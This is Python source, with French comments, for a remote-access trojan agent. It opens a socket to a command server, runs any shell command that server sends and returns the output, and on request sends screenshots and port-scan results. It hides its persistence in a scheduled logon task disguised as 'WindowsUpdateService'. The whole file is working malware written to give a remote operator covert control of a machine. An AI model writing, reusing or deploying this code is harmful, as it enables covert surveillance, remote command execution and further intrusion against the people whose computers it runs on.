import socket
import subprocess
import os
import sys
import threading
from PIL import ImageGrab

ip_add = "127.0.0.1"
port = 3280

# Persitance
def persistence():
    exe_path = sys.executable #recupère le chemin du script
    task_name = "WindowsUpdateService"

    os.system(f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon >nul 2>&1') #création d'une tâche planifié pour exécuter au démarrage

# Lance l'agent
def start_agent(s):
    s.connect((ip_add, port))
    data_socket(s)

# Recoie et envoie des données
def data_socket(s):
    while True:
        request = s.recv(1024)
        command = request.decode("utf-8")

        if command == "capture":
            screenshot(s)
        elif command.startswith("scan"):
            try:
                _, ip, port_range = command.split()
                result = scan_port(ip, port_range)
                s.send(result.encode("utf-8"))
            except ValueError:
                # Si la commande est mal formée, envoyer un message d'erreur au serveur
                s.send(b"Invalid scan command. Use: scan <ip> <start_port>-<end_port>\n")
        else: 
            execute_command(s, command)

# Execute la commande
def execute_command(s, command):
    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = result.communicate()
    output = stdout.decode("cp1252", errors="replace") + stderr.decode("cp1252", errors="replace")
    # Envoi du résultat au serveur
    s.send(output.encode("utf-8"))

# Fonction de screenshot
def screenshot(s):
    screen = ImageGrab.grab()

    image_bin = screen.tobytes() # Convertir l'image en binaire
    width, height = screen.size

    # Envoyer les dimensions et les données
    s.send(len(image_bin).to_bytes(4, 'big'))
    s.send(width.to_bytes(4, 'big')) 
    s.send(height.to_bytes(4, 'big'))  
    s.send(image_bin)

# Fonction de scanner de port
def scan_port(ip, port_range):
    start, end = map(int, port_range.split("-"))
    results = []
    for port in range(start, end + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as port_socket:
            port_socket.settimeout(2) 
            conn_result = port_socket.connect_ex((ip, port))  # Teste de la connexion
            if conn_result == 0:
                results.append(f"Port {port} is open")
            else:
                results.append(f"Port {port} is closed")
    return "\n".join(results) 


if __name__ == "__main__":

    persistence_thread = threading.Thread(target=persistence)
    persistence_thread.daemon = True  # Permet au thread de se fermer quand le programme principal termine
    persistence_thread.start()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    start_agent(s)
